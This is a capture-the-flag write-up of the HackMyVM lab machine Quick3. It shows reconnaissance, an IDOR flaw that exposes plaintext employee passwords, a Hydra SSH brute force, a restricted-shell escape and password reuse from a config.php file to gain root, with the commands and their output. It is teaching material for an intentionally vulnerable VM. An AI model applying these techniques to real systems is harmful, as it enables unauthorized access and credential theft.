---
title: Write-up Quick3 on HackMyVM
author: eMVee
date: 2024-03-15 00:00:00 +0000
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, IDOR, Password reuse]
render_with_liquid: false
---

In this writeup, we'll be going over the steps taken to compromise the Quick3 machine on HackMyVM. This machine is an easy-level challenge focused on IDOR, plaintext passwords and password reuse.

## Getting started
Before we start hacking the target we should create a project directory.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/
                                                              
┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Quick3     
                                                              
┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Quick3        
```

Next we should rung a ping sweep with `fping` to identify a new IP addredd of our target and assign it to a variable
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.42
                                                           
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ ip=10.0.2.42
```

It's worth a try to see if the machine replies to a ping request. It might help us to determine if we are talking against a Windows, Linux or another device such as a router or load balancer.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ ping -c 3 $ip
PING 10.0.2.42 (10.0.2.42) 56(84) bytes of data.
64 bytes from 10.0.2.42: icmp_seq=1 ttl=64 time=0.612 ms
64 bytes from 10.0.2.42: icmp_seq=2 ttl=64 time=1.25 ms
64 bytes from 10.0.2.42: icmp_seq=3 ttl=64 time=0.691 ms

--- 10.0.2.42 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2044ms
rtt min/avg/max/mdev = 0.612/0.850/1.247/0.282 ms

```
Based on the value in the `ttl` field we can indicate that the target is probably running on a Linux distro.

## Enumeration

The first step in any engagement is to gather as much information as possible about the target. We already started with some basig enumeration like identifying an IP address and sending a ping request. Our next step is running a port scan using Nmap to identify open ports and services running on the machine.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 15:55 CET
Nmap scan report for 10.0.2.42
Host is up (0.00048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Quick Automative
MAC Address: 08:00:27:28:12:35 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 10.0.2.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.45 seconds

```

When the nmap scan is finished we should take some notes based on the results.
- Linux, it is probably an Ubuntu Operating System
- Port 22
	- SSH
	- OpenSSH 8.9p1
- Port 80
	- HTTP
	- Apache 2.4.52
	- Title: Quick Automative

The most interesting port based on the results is port 80. We should consider enumerating this webservice first.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ whatweb http://$ip
http://10.0.2.42 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.0.2.42], Script[text/javascript], Title[Quick Automative]
```
We now can confirm a few details like:
- Ubuntu
- Apache 2.4.52
- Title: Quick Automative

Let's try to see if nikto can identify anything else that might be useful.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ nikto -h $ip 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.42
+ Target Hostname:    10.0.2.42
+ Target Port:        80
+ Start Time:         2024-01-24 15:59:51 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /images/: Directory indexing found.
+ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2024-01-24 16:00:13 (GMT1) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

There was not something juicy found by nikto. We should try to enumerate directories and files with dirsearch. 
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ dirsearch -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

   _|. _ _  _  _  _ _|_    v0.4.2                                                         
  (_||| _) (/_(_|| (_| )   

Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.0.2.42/_24-01-24_16-00-51.txt

Error Log: /home/emvee/.dirsearch/logs/errors-24-01-24_16-00-51.log

Target: http://10.0.2.42/

[16:00:51] Starting: 
[16:00:51] 301 -  307B  - /images  ->  http://10.0.2.42/images/            
[16:00:52] 301 -  308B  - /modules  ->  http://10.0.2.42/modules/          
[16:00:55] 301 -  304B  - /css  ->  http://10.0.2.42/css/                  
[16:00:59] 301 -  303B  - /js  ->  http://10.0.2.42/js/                    
[16:01:00] 301 -  309B  - /customer  ->  http://10.0.2.42/customer/ 
```

One of the directories shown on screen while dirserch was still running is `customer`.
This directory might be interesting: `customer`. Let's visit the website first.

![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240130223036.png){: width="700" height="400" }

It's a clean landing page for a car company, we can see that there is an orange button to make an `Make appointment`.
We should visit this part of the website to see what we can do on that page.

![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160322.png){: width="700" height="400" }

It looks like we can try to logon or create a customer account. Let's try to create a customer account.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160402.png){: width="700" height="400" }

When everything is set we have to register the user.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160425.png){: width="700" height="400" }

It worked, now we should try to logon to the customer portal to see if we can find something that we might can exploit.

![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160457.png){: width="700" height="400" }

The credentials did work and we can see a customer dashboard.

![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160519.png){: width="700" height="400" }

On the left there is a menu item `contact`. We should visit this page to see if we can find anything juicy.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124160540.png){: width="700" height="400" }

We can see all employees working for Quick Automative. Let's add the names to our notes. 
- Nick Greenhorn
- Andrew Speed 
- Mike Cooper 
- Jeff Anderson
- Lee Ka-shing
- Coos Busters
- Juan Mecánico
- John Smith
- Lara Johnson

On the right we can see a little dropdown menu. When we hove the mouse over the hyperlink we can see the URL with an `id=` parameter.
This should trigger us for looking for known vulnerabilities like SQL Injection and Insecure Direct Object Reference (IDOR). Let's visit this part of the website.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124161351.png){: width="700" height="400" }

We can see a user information page with more functionalities. One of the options is that we can change the password for the user. Let's visit the page.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124161446.png){: width="700" height="400" }

We can inspect the page by hitting the key `F12` on the keyboard to open the deveoper tools in Firefox.
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124161541.png){: width="700" height="400" }

If we inspect the fields we can see that the password is shown as plaintext in the value field. Based on the `id=` we should try to use some other values to see if we can see details of another user.

![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124161635.png){: width="700" height="400" }

It works! We should collect all passwords for all the employees. We don't collect the passwords for the customers since we want to gain access to the server.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ nano users

┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ nano passwords  
```

After creating lists for usernames and passwords we can use Hydra to brute force the SSH service to identify valid credentials.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ hydra ssh://$ip -L users  -P passwords -I  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-24 16:20:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:7/p:11), ~5 tries per task
[DATA] attacking ssh://10.0.2.42:22/
[22][ssh] host: 10.0.2.42   login: mike   password: 6G3UCx6aH6UYvJ6m
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-24 16:21:02

```
We have valid credentials for the user mike.

## Initial access
Now we should use the credentials to logon to the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ ssh mike@$ip  
mike@10.0.2.42's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 24 03:21:52 PM UTC 2024

  System load:  0.033203125       Processes:               116
  Usage of /:   56.0% of 9.75GB   Users logged in:         0
  Memory usage: 32%               IPv4 address for enp0s3: 10.0.2.42
  Swap usage:   0%                IPv4 address for enp0s8: 10.0.2.43


Expanded Security Maintenance for Applications is not enabled.

45 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 24 12:56:53 2024 from 10.0.2.15
mike@quick3:~$ 

```
The welcome message shows us that we are working on an Ubuntu machine. Let's enumerate the home directory of Mike.
```bash
mike@quick3:~$ ll
total 36
drwxr-x---  4 mike mike 4096 Jan 24 12:56 ./
drwxr-xr-x 11 root root 4096 Jan 24 10:38 ../
lrwxrwxrwx  1 mike mike    9 Jan 24 10:46 .bash_history -> /dev/null
-rw-r--r--  1 mike mike  220 Jan 21 13:57 .bash_logout
-rw-r--r--  1 mike mike 3797 Jan 24 12:56 .bashrc
drwx------  2 mike mike 4096 Jan 21 14:00 .cache/
drwxrwxr-x  3 mike mike 4096 Jan 21 13:58 .local/
-rw-r--r--  1 mike mike  807 Jan 21 13:57 .profile
-rw-rw-r--  1 mike mike 4166 Jan 21 13:58 user.txt

```
We now can capture the user flag on Quick3!
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124162308.png){: width="700" height="400" }


Next we should start enumerating on the target it self. Let's first move to the root of the system.
```bash
mike@quick3:~$ cd /
-rbash: cd: restricted

```
We are working in a restriced shell (rbash).This can be easily be bypassed with a few arguments added to the `ssh` command.
The `-t` option forces pseudo-terminal allocation, which is necessary for some SSH commands to work properly.

The bash `--noprofile -i` command is used to start a new Bash shell session without loading the user's profile files (~/.bash_profile, ~/.bashrc, etc.) and with an interactive shell.

This command can be useful when you want to quickly connect to a remote machine and start a shell session without loading any custom configurations or environment variables. It can also be useful when you want to ensure that the remote machine's environment is not affected by any local configurations or environment variables.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick3]
└─$ ssh mike@$ip -t "bash --noprofile -i"                                                        
mike@10.0.2.42's password: 
```
Let's first move to the root of the system again and check what directories are present.
```bash
mike@quick3:~$ cd /
mike@quick3:/$ ll
total 1840208
drwxr-xr-x  20 root root       4096 Jan 14 20:49 ./
drwxr-xr-x  20 root root       4096 Jan 14 20:49 ../
lrwxrwxrwx   1 root root          7 Aug 10 00:17 bin -> usr/bin/
drwxr-xr-x   4 root root       4096 Jan 14 20:50 boot/
dr-xr-xr-x   2 root root       4096 Aug 10 05:06 cdrom/
drwxr-xr-x  20 root root       4080 Jan 24 14:50 dev/
drwxr-xr-x 100 root root       4096 Jan 24 13:03 etc/
drwxr-xr-x  11 root root       4096 Jan 24 10:38 home/
lrwxrwxrwx   1 root root          7 Aug 10 00:17 lib -> usr/lib/
lrwxrwxrwx   1 root root          9 Aug 10 00:17 lib32 -> usr/lib32/
lrwxrwxrwx   1 root root          9 Aug 10 00:17 lib64 -> usr/lib64/
lrwxrwxrwx   1 root root         10 Aug 10 00:17 libx32 -> usr/libx32/
drwx------   2 root root      16384 Jan 14 20:47 lost+found/
drwxr-xr-x   2 root root       4096 Aug 10 00:17 media/
drwxr-xr-x   2 root root       4096 Aug 10 00:17 mnt/
drwxr-xr-x   2 root root       4096 Aug 10 00:17 opt/
dr-xr-xr-x 177 root root          0 Jan 24 14:50 proc/
drwx------   6 root root       4096 Jan 24 13:02 root/
drwxr-xr-x  30 root root        860 Jan 24 15:25 run/
lrwxrwxrwx   1 root root          8 Aug 10 00:17 sbin -> usr/sbin/
drwxr-xr-x   6 root root       4096 Aug 10 00:22 snap/
drwxr-xr-x   2 root root       4096 Aug 10 00:17 srv/
-rw-------   1 root root 1884291072 Jan 14 20:49 swap.img
dr-xr-xr-x  13 root root          0 Jan 24 14:50 sys/
drwxrwxrwt  13 root root       4096 Jan 24 15:09 tmp/
drwxr-xr-x  14 root root       4096 Aug 10 00:17 usr/
drwxr-xr-x  14 root root       4096 Jan 21 14:02 var/
mike@quick3:/$ 

```
Let's check the data in the customer directory. This webapplication (PHP)probably have something like a configuration file with an username and password for the database.
```bash
mike@quick3:/$ cd /var/www/html/customer/
mike@quick3:/var/www/html/customer$ ll
total 232
drwxr-xr-x 7 www-data www-data  4096 Jan 24 12:48 ./
drwxr-xr-x 8 www-data www-data  4096 Jan 22 20:00 ../
-rw-r--r-- 1 www-data www-data 19730 Jan 23 20:58 cars.php
-rw-r--r-- 1 www-data www-data   202 Jan 21 15:28 config.php
-rw-r--r-- 1 www-data www-data 35755 Jan 23 16:15 contact.php
drwxr-xr-x 2 www-data www-data  4096 Jan 22 19:38 css/
-rw-r--r-- 1 www-data www-data  9834 Jan 23 16:16 dashboard.php
drwxr-xr-x 2 www-data www-data  4096 Jan 22 19:38 fonts/
drwxr-xr-x 5 www-data www-data  4096 Jan 22 19:38 images/
-rw-r--r-- 1 www-data www-data  3171 Jan 22 19:34 index.php
drwxr-xr-x 2 www-data www-data  4096 Jan 22 19:38 js/
-rw-r--r-- 1 www-data www-data  4118 Jan 24 12:43 login.css
-rw-r--r-- 1 www-data www-data   805 Jan 21 15:37 login.php
-rw-r--r-- 1 www-data www-data   184 Jan 21 15:41 logout.php
drwxr-xr-x 2 www-data www-data 20480 Jan 22 19:38 modules/
-rw-r--r-- 1 www-data www-data   451 Jan 23 21:24 remove.php
-rw-r--r-- 1 www-data www-data   372 Jan 24 12:30 script.js
-rw-r--r-- 1 www-data www-data 57002 Jan 24 12:48 style.css
-rw-r--r-- 1 www-data www-data  1121 Jan 23 21:19 submitcar.php
-rw-r--r-- 1 www-data www-data  1104 Jan 24 09:10 updatepassword.php
-rw-r--r-- 1 www-data www-data  1213 Jan 24 08:06 updateuser.php
-rw-r--r-- 1 www-data www-data 19307 Jan 24 09:04 user.php

```
There is a `config.php` file present. We should inspect the file and if there are credentials mentioned, we should add them to our notes.

```bash
mike@quick3:/var/www/html/customer$ cat config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>

```
We got a new password for a root user in the database. 

## Privilege escalation
We should try to use the password for switching to the root user.
```bash
mike@quick3:/var/www/html/customer$ su root
Password: 
root@quick3:/var/www/html/customer# 

```
We only have to capture the root flag, so let's do it!
![image](/assets/img/WriteUp/HackMyVM/Quick3/Pasted image 20240124163042.png){: width="700" height="400" }

## Conclusion

In this writeup, we demonstrated the process of identifying and exploiting vulnerabilities on the Quick3 machine. While someof the vulnerabilities we identified did not lead to any sensitive information or functionality, others did. By chaining together multiple vulnerabilities, we were able to gain access to the machine's root flag.

Remember to always perform thorough reconnaissance and analysis before attempting to exploit vulnerabilities. Happy hacking!